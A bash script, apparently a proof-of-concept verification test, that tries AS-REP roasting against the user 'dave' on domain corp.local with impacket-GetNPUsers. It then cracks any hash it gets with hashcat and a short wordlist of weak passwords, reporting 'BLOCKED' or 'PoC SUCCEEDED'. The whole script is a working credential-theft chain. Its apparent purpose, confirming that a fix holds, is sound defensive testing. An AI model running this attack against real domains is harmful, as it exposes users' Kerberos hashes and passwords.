#!/usr/bin/env bash
set -euo pipefail
cd "$(mktemp -d)"
echo dave > users.txt
/usr/bin/impacket-GetNPUsers 'corp.local/' -usersfile users.txt -dc-ip 10.20.30.5 -no-pass -outputfile asrep.hashes 2>&1 | tee out.txt || true
echo "--- GetNPUsers output ---"; cat out.txt; echo "--- /GetNPUsers ---"
if [ ! -s asrep.hashes ]; then
    if grep -qiE 'user dave is not vulnerable|preauthentication required|does not have UF_DONT_REQUIRE_PREAUTH' out.txt; then
        echo "[verify-poc-04] dave requires pre-auth -- BLOCKED"; exit 0
    fi
    echo "[verify-poc-04] no AS-REP hash dumped -- BLOCKED"; exit 0
fi
cat > wl <<'EOF'
Password1!
Winter24
Summer24
Autumn24
Spring24
Welcome1
EOF
if ! command -v hashcat >/dev/null 2>&1; then
    echo "[verify-poc-04] hashcat unavailable -- BLOCKED"; exit 0
fi
CRACK=$(timeout 30 hashcat -m 18200 -a 0 --quiet --potfile-path=/dev/null asrep.hashes wl 2>&1 || true)
echo "--- hashcat ---"; echo "$CRACK"
if echo "$CRACK" | grep -qE '\$krb5asrep\$23\$.*:[A-Za-z0-9!]+$'; then
    PW=$(echo "$CRACK" | grep -oE ':[^:]+$' | tail -1 | tr -d ':')
    echo "[verify-poc-04] cracked dave's password '$PW' -- PoC SUCCEEDED" >&2; exit 1
fi
echo "[verify-poc-04] AS-REP obtained but pwd uncracked -- BLOCKED"; exit 0
